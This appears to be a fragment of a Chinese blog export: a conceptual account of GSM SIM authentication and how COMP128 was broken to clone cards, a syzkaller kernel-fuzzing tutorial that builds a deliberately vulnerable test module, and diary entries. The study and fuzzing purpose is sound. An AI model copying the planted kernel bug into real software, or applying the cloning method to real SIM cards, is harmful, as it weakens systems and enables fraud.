业务代码：如个人识别码（PIN）、解锁码（PUK）、计费费率等\n- 电话号码、短消息等用户记录\n\n（以上四类数据，除第一类只有专业部门能查阅和更新外，其他几类都是手机可查阅和更新的）\n\n2、PIN码保护\n\n3、用户身份鉴权\n\n4、SIM卡中的保密算法及密钥\n\n## sim卡认证\n\nSIM卡中没有存储本机号码，仅有IMIS号。当我们在营业厅申请并注册手机号时，运营商将手机号码与SIM卡的IMSI号、序列号以及鉴权密钥Ki做登记，储存在数据库里。\n\nSIM卡插入到手机中开机时，手机向SIM卡请求IMSI，然后把IMSI发送给运营商。运营商在数据库中查找是否存在这个IMSI并判断是否为合法用户，然后获得这个IMSI对应的手机号码和鉴权密钥Ki。\n\n运营商再生成一个随机数RAND，然后将该随机数发送给手机。手机接收到随机数RAND后，将该随机数RAND发送给SIM卡。SIM卡利用RAND和鉴权密钥Ki通过A3算法生成应答SRES，将SRES发送给手机，再由手机转发给运营商。运营商在本地利用RAND和对应的鉴权密钥Ki进行相同的运算，得到X-SRES，并比较SRES和X-SRES是否相同，相同的话就说明这个卡是合法的，允许其接入网络。\n\n上一步骤中，手机端收到RAND时，同时还会让SIM卡利用RAND和Ki计算出一个通信用的加密密钥Kc，计算时用的算法称之为A8。由于A3和A8接受的输入相同，因此实现者偷了个懒，用一个算法同时生成SRES和Kc。\n\n之后的通信过程中，使用加密密钥Kc和A5算法对通信内容进行加密。由于通信内容的加密量巨大，SIM卡无法快速处理如此多的加密需求，因此通信过程中的加密都是在手机上完成的。因此，所有的GSM手机都必须至少支持一种相同的A5算法，否则就无法漫游了。这时候运营商和设备商又偷了个懒，全世界目前都只用一种A5算法。这个算法的做法就是和Kc的8字节序列进行简单的循环XOR，再和报文序号做个减法。\n\n## sim卡复制\n\n从以上SIM卡认证原理中，我们知道IMSI和Ki是必不可少的，A3算法也必须知道。IMSI可以通过手机将其从SIM卡中读取出来，但是A3算法和鉴权密钥Ki是无法直接获取的，只能通过某种方法破解。\n\nA3算法一直被作为高级商业机密保护起来。但在1998年左右，有个人泄露了几页关于A3算法的文档到网络上。加州伯克利的几个教授拿到这个文档后，对照着SIM卡研究了一阵，最终将A3算法破解了。这个算法又叫做Comp128。\n\n怎么获取Ki呢？两个思路，一种是把SIM卡拆掉然后接到特殊设备上将Ki读取出来，另一种是利用Comp128去暴力破解、穷举。前一种方法就像用小刀在硬盘上刻操作系统一样不靠谱。后一种方法有一定的限制，SIM卡中的逻辑是一共只能查询2^16次左右，之后卡就不可用了。因此，研究者们只能在可接受的次数之内，通过构造特定明文和分析输出的密文来破解Ki的值。这种方法最终成功了。\n\n由于SIM复制设备越来越多，运营商们不得不发行新算法的卡，这个算法叫做Comp128 v2。这个算法目前为止还没被破解。\n\n\n# reference\nSIM卡实现原理：https://www.jianshu.com/p/8c9374f5e581\n\n4G LTE 网只能提供数据服务，不能承载语音通话，该怎么理解？https://www.zhihu.com/question/22365275\n\nSIM卡复制原理：https://cn.club.vmall.com/thread-2454925-1-1.html\n\n关于SIM和eSIM，看这一篇就够啦！https://zhuanlan.zhihu.com/p/47999705\n\nSIM卡中的A3、A5和A8算法：http://www.360doc.com/content/11/0913/22/3129476_148024343.shtml\n\n什么是伪基站？https://www.zhihu.com/question/36723973","categories":["通信"]},{"title":"syzkaller","url":"/2019/10/26/syzkaller/","content":"\n# 1.总览\n\n关于[Syzkaller](https://github.com/google/syzkaller)是什么，我就不多说了，介绍的文档很多。直接进入正题吧~\n\ngithub上英文版的指导中，有些许坑需要自己踩踩，所以将搭建syzkaller的环境记录下来，供之后参考。本文计划搭建如下几个环境（会不断更新）：\n\n```\n1. 使用syzkaller去fuzz x86-64架构的linux内核，这个内核是用qemu模拟的。\n2. 使用syzkaller去fuzz arm64的手机设备，qemu模拟和实体机都准备尝试一下。\n3. 两台通过网络连接的linux机器之间的fuzz。\n```\n\n在正式开始之前，先说一下基本环境。我用来搭建环境的主机是Ubuntu18.04虚拟机，gcc版本是7.5.0。\n\n```\nsyzkaller官网对gcc版本的要求是>6.1.0。所以如果你的主机是Ubuntu16.04的话，可以按照安装gcc章节升级一下本地gcc版本。\n```\n\nubuntu 18.04搭建syzkaller环境，需要做以下四件事情：\n\n- 1、准备好C编译环境。\n\n- 2、准备好待测试的Linux kernel，并开启coverage代码覆盖率选项。\n\n\n- 3、准备测试机，虚拟机或者物理机。\n\n- 4、准备好syzkaller源码，并编译。（由于syzkaller是由go语言写的，所以这里需要提前安装好go语言环境）\n\n# 2.安装GCC\n\n> gcc下载地址：[gcc下载](http://ftp.gnu.org/gnu/gcc/)\n\n宿主机自带的gcc版本过低的话，需要在原本的基础上新装一个高版本的gcc。这里我选择源码安装，并且将它安装到一个单独目录，这样今后想卸载的话，直接删除该目录即可。\n\n- 解压gcc-7.4.0源码包：`tar -zxvf gcc-7.4.0.tar.gz`（或者`tar -Jxvf gcc-7.4.0.tar.xz`）\n- 下载安装依赖项：在解压完的源码包中，执行./contrib/download_prerequisites（需更改base_url为http://mirror.linux-ia64.org/gnu/gcc/infrastructure/，如果执行时一直没有进度，考虑加上sudo权限执行）。若执行不成功，则需自行下载安装，步骤如下。\n\n```\ngcc7.4.0依赖的gmp,mpfr和mpc版本如下：\n\tgmp='gmp-6.1.0.tar.bz2'\n\tmpfr='mpfr-3.1.4.tar.bz2'\n\tmpc='mpc-1.0.3.tar.gz'\n\n安装过程参考链接：\nhttps://blog.csdn.net/lwbeyond/article/details/77718040（主要参考该文档）\nhttps://blog.csdn.net/xs1102/article/details/89175293\nhttps://blog.csdn.net/davidhopper/article/details/79681695\n\n安装gmp到configure步骤时，出现“no usable m4”错误：\nhttps://blog.csdn.net/wangqing_12345/article/details/52484723\n```\n\n# 3 x86-64 linux kernel in qemu\n\n> 标题解释：这一小节的fuzz对象是linux kernel，架构是x86-64，是使用qemu模拟出来的。\n\n## 3.1 编译syzkaller\n\n### 3.1.1 搞定go环境\n\ngo官网：[https://golang.org/dl](https://golang.org/dl/)\n\n```shell\nwget https://dl.google.com/go/go1.14.2.linux-amd64.tar.gz\ntar -xf go1.14.2.linux-amd64.tar.gz\nmv go goroot\nmkdir gopath\nexport GOPATH=`pwd`/gopath\nexport GOROOT=`pwd`/goroot\nexport PATH=$GOPATH/bin:$PATH\nexport PATH=$GOROOT/bin:$PATH\n```\n\n- goroot/ 存放go源码\n\n- gopath/ 是go的工作目录\n\n需要将它们都添加到环境变量`~/bashrc`中去，然后再`source ~/.bashrc`更新一下环境变量。\n\n### 3.1.2 下载syzkaller源码\n\n```shell\ngo get -u -d github.com/google/syzkaller/prog\n```\n\n不要小瞧这一行代码，如果不把代理配置好，咱们在国内的同学可是要下哭。关于代理的配置，之后有空再更新文章吧。\n\n### 3.1.3 编译syzkaller\n\n```shell\ncd gopath/src/github.com/google/syzkaller/\nmake\n```\n\n这里需要注意，如果是在虚拟机中编译，要把虚拟机内存给多一点，比如8G。（我一开始只给了虚拟机4G内存，结果编译不通过）\n\n编译通过后，就可以在syzkaller的bin/下看到二进制文件啦。\n\n ![](syzkaller-mgr.png)\n\n## 3.2 编译linux kernel\n\nlinux kenrel github链接：[https://github.com/torvalds/linux](https://github.com/torvalds/linux)\n\n### 3.2.1 一切顺利的情况\n\n1. 下载linux源码\n\n```shell\ngit clone git://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git\n```\n\n2. 生成配置文件\n\n```shell\ncd $kernel\nmake defconfig\nmake kvmconfig\n```\n\n3. 更改.config文件对内核的配置选项或者使用`make menuconfig`进行配置\n\n```shell\n# Coverage collection.\nCONFIG_KCOV=y\n\n# Debug info for symbolization.\nCONFIG_DEBUG_INFO=y\n\n# Memory bug detector\nCONFIG_KASAN=y\nCONFIG_KASAN_INLINE=y\n\n# Required for Debian Stretch\nCONFIG_CONFIGFS_FS=y\nCONFIG_SECURITYFS=y\n```\n\n4. 重新生成config文件\n\n```shell\nmake olddefconfig\n```\n\n5. 开始编译内核\n\n```shell\nmake -j4\n```\n\n编译完成后，可以在如下目录中看到vmlinux和bzImage文件\n\n```shell\n$ ls $KERNEL/vmlinux\n$KERNEL/vmlinux\n$ ls $KERNEL/arch/x86/boot/bzImage\n$KERNEL/arch/x86/boot/bzImage\n```\n\n### 3.2.2 若gcc版本过低\n\n最初有一次使用gcc 7.1.0编译最新版kernel时出错`“You are building kernel with non-retpoline compiler, please update your compiler..”`。查阅了一些资料显示，是由于retpoline只有gcc7.3.0及以上的版本才支持，因此需要在本地编译一个高版本gcc，并使用如下方式指定make时的编译器。以gcc8.0.1为例，编译过程如下：\n\n```shell\ncd $KERNEL\nmake CC=\" /usr/local/gcc-8.0.1/bin/gcc\" defconfig\nmake CC=\" /usr/local/gcc-8.0.1/bin/gcc\" kvmconfig\n```\n\n然后更改.config文件中的选项，使其支持我们需要的一些功能\n\n```shell\nCONFIG_KCOV=y\nCONFIG_DEBUG_INFO=y\nCONFIG_KASAN=y\nCONFIG_KASAN_INLINE=y\nCONFIG_CONFIGFS_FS=y\nCONFIG_SECURITYFS=y\n```\n\n保存完该文件后，编译\n\n```shell\nmake CC=\" /usr/local/gcc-8.0.1/bin/gcc\" oldconfig\nmake CC=\" /usr/local/gcc-8.0.1/bin/gcc\" -j4\n```\n\n编译完成后，可以看到vmlinux（kernel binary）和bzImage（packed kernel image）。\n\n![](syzkaller-vmlinux.png)\n\n## 3.3 配置qemu vm\n\n1. 安装qemu\n\n使用一条简单的命令即可：\n\n```shell\nsudo apt-get install qemu-system-x86\n```\n\n2. 生成image\n\n使用debootstrap构建linux启动镜像：\n\n```shell\nsudo apt-get install debootstrap\ncd $IMAGE/\nwget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh\nchmod +x create-image.sh\n./create-image.sh\n\n# 可以使用./create-image.sh -h查看更多帮助选项\n```\n\n完成之后目录内容如下：\n\n```shell\nbling@Ubuntu1804:~/s_image$ ll\ntotal 502072\ndrwxr-xr-x  3 bling bling       4096 1月   9 09:03 ./\ndrwxr-xr-x 25 bling bling       4096 1月   9 00:45 ../\ndrwxr-xr-x 21 root  root        4096 1月   9 02:25 chroot/\n-rwxr-xr-x  1 bling bling       6360 1月   9 00:13 create-image.sh*\n-rw-------  1 bling bling       1675 1月   9 09:03 stretch.id_rsa\n-rw-r--r--  1 bling bling        398 1月   9 09:03 stretch.id_rsa.pub\n-rw-r--r--  1 bling bling 2147483648 1月   9 09:04 stretch.img\n```\n\n3. 启动虚拟机\n\n启动虚拟机试试\n\n```shell\nqemu-system-x86_64 -m 2G -smp 2 -kernel /home/bling/Downloads/linux-5.5.1/arch/x86/boot/bzImage -append \"console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0\" -drive file=/home/bling/s_image/stretch.img,format=raw -net user,hostfwd=tcp:127.0.0.1:10021-:22 -net nic,model=e1000 -enable-kvm -nographic -pidfile vm.pid 2>&1 | tee vm.log\n```\n\n对以上各参数我的理解如下：\n\n```\n-kernel xxx/bzImage：用bzImage作为内核镜像，qemu的这个功能用来测试不同内核非常方便。\n-append cmdline：将cmdline作为内核的命令行参数\n-hda xxx/xxx.img：指定xxx.img作为硬盘镜像\n-net user,hostfwd=tcp::10021-:22 -net nic：客户机与宿主机之间通过指定的端口进行通讯\n-enable-kvm：开启kvm虚拟化\n-nographic：非图形界面启动\n-m 2G：分配2G内存给虚拟系统\n-smp 2：指定虚拟机由2个CPU\n-pidfile xxx.pid：将qemu进程pid储存在xxx.pid这个文件中\n2>&1 | tee vm.log：将执行过程中的输出同时定向到标准输出和vm.log文件中\n```\n\n参考了两篇文章：（1）[hostfwd的问题](https://blog.csdn.net/tzwsoho/article/details/80303088) （2）[make 2>&1 | tee log.txt 命令解析](https://blog.csdn.net/Dr_Unknown/article/details/76837708)\n\nqemu启动起来之后，运行ssh测试一下是否连通，便于后期syzkaller运行出错时定位问题。\n\n```shell\nssh -i $IMAGE/stretch.id_rsa -p 10021 -o \"StrictHostKeyChecking no\" root@localhost\n```\n\n曾经有一次连接时在这里出了问题，宿主机上ssh无法连接到虚拟机。原因如下：\n\n由于上一步中create-image.sh中如下eth0跟实际qemu虚拟机中运行的网卡名称不一样，导致网卡没有分配IP地址。最后解决方法如下：qemu启动虚拟机，root用户身份登录后，设置网卡IP地址。\n\n![](syzkaller-ethnet.png)\n\n参考文章：（1）[网卡没分配IP地址的解决方法](https://blog.csdn.net/wuzhong8809/article/details/83374140)（2）[rsa公私钥知识点](https://xuanxuanblingbling.github.io/ctf/web/2019/05/10/rsa/)（3）[一个自己生成公私钥配置的方法](http://embedsec.systems/zh/gnulinux-security/2017/06/05/syzkaller.html)\n\n```shell\n# 关闭qemu虚拟机\nkill $(cat vm.pid)\n```\n\n## 3.4 启动syzkaller\n\n为了使syzkaller运行起来，在syzkaller目录下，新建一个workdir目录，并新建一个config文件用于配置运行所需参数（命名为xxx.cfg）\n\n```shell\nmkdir workdir\n./bin/syz-manager -config=abcd.cfg\n```\n\ncfg文件的格式如下，根据实际情况各参数可做更改：\n\n```\n{\n        \"target\": \"linux/amd64\",\n        \"http\": \"127.0.0.1:56741\",\n        \"workdir\": \"/home/bling/gopath/src/github.com/google/syzkaller/workdir\",\n        \"kernel_obj\": \"/home/bling/Downloads/linux-5.5.1\",\n        \"image\": \"/home/bling/s_image/stretch.img\",\n        \"sshkey\": \"/home/bling/s_image/stretch.id_rsa\",\n        \"syzkaller\": \"/home/bling/gopath/src/github.com/google/syzkaller/\",\n        \"procs\": 8,\n        \"type\": \"qemu\",\n        \"vm\": {\n                \"count\": 4,\n                \"kernel\": \"/home/bling/Downloads/linux-5.5.1/arch/x86/boot/bzImage\",\n                \"cpu\": 2,\n                \"mem\": 2048\n        }\n}\n```\n\n执行成功后，如下图所示：\n\n![](syzkaller-running.png)\n\n\n\n# 4 arm64 android kernel goldfish\n\n> 标题解释：这一小节的fuzz对象是linux kernel，架构是arm64，是使用goldfish模拟出来的。\n\n待补充...\n\n\n\n# 5 定制\n\n> 对于新的内核接口，增加系统调用描述\n\n## 5.1 syz-extract和syz-sysgen\n\nsyzkaller在编译的时候，默认不会编译syz-extract这个模块。因此我们需要手工编译一下。\n\n在syzkaller源码目录下，执行如下命令：\n\n```\nmake bin/syz-extract\n```\n\n如果syz-sysgen也没默认编译的话，执行如下命令：\n\n```\nmake bin/syz-sysgen\n```\n\n他俩的关系是这样的：\n\n```\n         +-------+            +---------+           +------+\n         |xxx.txt+----------->|xxx.const+---------->|xxx.go|\n         +---+---+            +---------+           +------+\n             |    syz-extract            syz-sysgen    ^\n             |                                         |\n             +-----------------------------------------+\n```\n\n我们针对某个驱动接口写出xxx.txt，然后使用syz-extract利用txt和源码生成const文档，最后执行syz-sysgen时syzkaller会根据txt和const生成一个go文件。可在sys/linux/gen/amd64.go和executor/syscalls.h中看到结果。\n\n## 5.2 一次定制示例\n\n- 编写一个有漏洞的驱动接口，并将其编译进内核（或者使用打ko的方式）。\n- 编写驱动接口对应的txt文件，将其放入syzkaller/sys/linux目录下，生成go文件并重新编译syzkaller。\n- 运行syzkaller，改config文件指定fuzz接口提高速率，最后分析crash。\n\n### 5.2.1 构造一个内核模块的漏洞\n\n1. 在`kernel_src/drivers/char`目录下，新建一个testxy.c。内容如下，这是一个有漏洞的内核模块。\n\n```c\n#include <linux/init.h>\n#include <linux/module.h>\n#include <linux/proc_fs.h>\n#include <linux/uaccess.h>\n#include <linux/slab.h>\n\n#define MY_DEV_NAME \"test\"\n#define DEBUG_FLAG \"PROC_DEV\"\n\nstatic ssize_t proc_read (struct file *proc_file, char __user *proc_user, size_t n, loff_t *loff);\nstatic ssize_t proc_write (struct file *proc_file, const char __user *proc_user, size_t n, loff_t *loff);\nstatic int proc_open (struct inode *proc_inode, struct file *proc_file);\nstatic struct file_operations a = {\n                                .open = proc_open,\n                                .read = proc_read,\n                                .write = proc_write,\n};\n\n\nstatic int __init mod_init(void)\n{\n    struct proc_dir_entry *test_entry;\n    const struct file_operations *proc_fops = &a;\n    printk(DEBUG_FLAG\":proc init start!\\n\");\n\n    test_entry = proc_create(MY_DEV_NAME, S_IRUGO|S_IWUGO, NULL, proc_fops);\n    if(!test_entry)\n       printk(DEBUG_FLAG\":there is somethings wrong!\\n\");\n\n    printk(DEBUG_FLAG\":proc init over!\\n\");\n    return 0;\n}\n```\n\n2. 打开char/目录下的Kconfig文件，添加：\n\n```shell\nconfig TESTXY_MODULE\n        tristate \"heap overflow test\"\n        default y\n        help\n          This file is to test a buffer overflow.\n```\n\n3. 打开char/目录下的Makefile文件，添加：\n\n```shell\nobj-$(CONFIG_TESTXY_MODULE) += testxy.o\n```\n\n若/linux/drivers/char/是新目录，还需修改/linux/drivers/Kconfig（加上source \"drivers/char/Kconfig\"）；修改/linux/drivers/Makefile（加上obj-$(CONFIG_TEST_MODULE) += char/）。\n\n4. make menuconfig时可以在`Device Drivers -> Character devices -> Heap Overflow Test` (*表示直接编如内核，M表示模块形式) 处看到刚刚添加的测试模块。\n\n```shell\nmake clean\nmake menuconfig\nmake -j8\n```\n\n5. 用新的内核启动虚拟机，查看模块是否加载成功\n\n```shell\n# 查看模块对应设备节点是否存在\nls /proc/test\n# 查看模块加载时的log信息\ndmesg | grep \"proc init\"\n```\n\n### 5.2.2 定制txt系统调用描述文件\n\n1. syzkaller源码中，找到sys/linux/目录，新建一个文件，命名为`proc_operation.txt`，内容如下：\n\n```\ninclude <linux/fs.h>\n\nopen$proc(file ptr[in, string[\"/proc/test\"]], flags flags[proc_open_flags], mode flags[proc_open_mode]) fd\nread$proc(fd fd, buf buffer[out], count len[buf]) len[buf]\nwrite$proc(fd fd, buf buffer[in], count len[buf]) len[buf]\nclose$proc(fd fd)\n\nproc_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE\nproc_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH\n\n```\n\n2. 使用syz-extract生成const文件。指定txt文件名，可单独生成该文件对应的const文件。\n\n```shell\nbin/syz-extract -os linux -sourcedir \"/home/bling/Downloads/linux-5.5.1\" -arch amd64 proc_operation.txt\n```\n\n3. 运行syz-sysgen\n4. 重新编译syzkaller\n\n```shell\nmake clean\nmake\n```\n\n### 5.2.3 验证能否成功触发crash\n\n启动syzkaller的配置文件如下。为了更快看到crash结果，增加了“enable_syscalls”项，只允许某些系统调用，效率更快。\n\n```\n{\n        \"target\": \"linux/amd64\",\n        \"http\": \"127.0.0.1:56741\",\n        \"workdir\": \"/home/bling/gopath/src/github.com/google/syzkaller/workdir\",\n        \"kernel_obj\": \"/home/bling/Downloads/linux-5.5.1\",\n        \"image\": \"/home/bling/s_image/stretch.img\",\n        \"sshkey\": \"/home/bling/s_image/stretch.id_rsa\",\n        \"syzkaller\": \"/home/bling/gopath/src/github.com/google/syzkaller/\",\n        \"procs\": 8,\n        \"type\": \"qemu\",\n        \"enable_syscalls\":[\n        \t\t\"open$proc\",\n        \t\t\"read$proc\",\n        \t\t\"write$proc\",\n        \t\t\"close$proc\"\n        ],\n        \"vm\": {\n                \"count\": 4,\n                \"kernel\": \"/home/bling/Downloads/linux-5.5.1/arch/x86/boot/bzImage\",\n                \"cpu\": 2,\n                \"mem\": 2048\n        }\n}\n```\n\n启动syzkaller进行测试：\n\n```\n./bin/syz-manager -config=abcd.cfg\n```\n\n触发到漏洞分支！\n\n![](syzkaller-display1.png)\n\n![](syzkaller-display2.png)\n\n![](syzkaller-display3.png)\n\n## 5.3 txt文件语法\n\nhttp://embedsec.systems/zh/gnulinux-security/2017/06/05/syzkaller-demo.html\n\n## 5.4 config文件\n\n[config文件示例](https://github.com/google/syzkaller/blob/master/pkg/mgrconfig/testdata/qemu.cfg)\n\n[config文件参数详解](https://github.com/google/syzkaller/blob/master/pkg/mgrconfig/config.go)\n\n# 编译ko的方法\n\ntest.c\n\n```c\n#include <linux/init.h>\n#include <linux/module.h>\n \nMODULE_LICENSE(\"Dual BSD/GPL\");\n \nstatic int hello_init(void)\n{\n        printk(KERN_ALERT \"Hello, world\\n\");\n        return 0;\n}\n \nstatic void hello_exit(void)\n{\n        printk(KERN_ALERT \"Goodbye, cruel world\\n\");\n}\n \nmodule_init(hello_init);\nmodule_exit(hello_exit);\n```\n\nMakefile\n\n```shell\nobj-m := testxy.o\n\nKDIR = /home/bling/Downloads/linux-5.5.1/\n\nall:\n        make -C $(KDIR) M=$(PWD) modules \n\nclean:\n        rm -rf *.o *.ko *.mod.* *.symvers *.order\n```\n\n\n\n# 参考文章推荐\n\n[内核漏洞挖掘技术系列(4)——syzkaller(1)](https://xz.aliyun.com/t/5079?spm=5176.12901015.0.i12901015.3af8525coJ6I6t)\n\n[【漏洞挖掘】使用Syzkaller&QEMU捕捉内核堆溢出Demo](https://www.jianshu.com/p/790b733f80a2)\n\n[Syzkaller Crash Demo](http://pwn4.fun/2019/10/09/Syzkaller-Crash-Demo/)\n\n\n\n\n\n\n\n","categories":["Fuzzing"]},{"title":"things","url":"/1994/10/23/things/","content":"\n# 20200523\n\n忙碌的一天\n\n- 8:40被电话吵醒去营业厅办宽带。\n- 10:20喊物业来家里修水池。\n- 11:00外卖到了，吃早午饭。\n- 11:30装宽带的师傅来安装光猫，调试。\n- 12:50跟氕氕约着一起去按摩肩颈疏通下经络，然后又刮了个痧，现在整个背又痛又不能看。但是真的舒服。\n- 15:30去公司赶项目报告。\n- 18:30一个人在公司楼下吃了个晚饭。食堂比外卖好吃多了。\n- 19:00坐公交车遇到一个凶凶的司机。\n- 20:30男票带我一起研究了一下我俩突然无法翻墙的服务器，如下图所示。原因是GFW把我们服务器发回的ACK响应包给截了。哈哈哈有用的知识又增加了！\n\n![](evil-gfw.png)\n\n# 20200919\n\n突发奇想，想要捡起从初中开始就很喜欢但从高中毕业就没好好学过的英语。曲曲折折绕了一圈又一圈，最终还是会回到心中的原点。一个人一辈子只做一件事，并且能一直做好，也是一件很了不起的事情啊。\n\n给自己定个小目标吧，明年把CATTI二级考过，扎实一下翻译功底。加油加油！\n\n\n\n# 20201117\n\n时间过得可真快。一天天都干了啥呢。","categories":["Life"]}]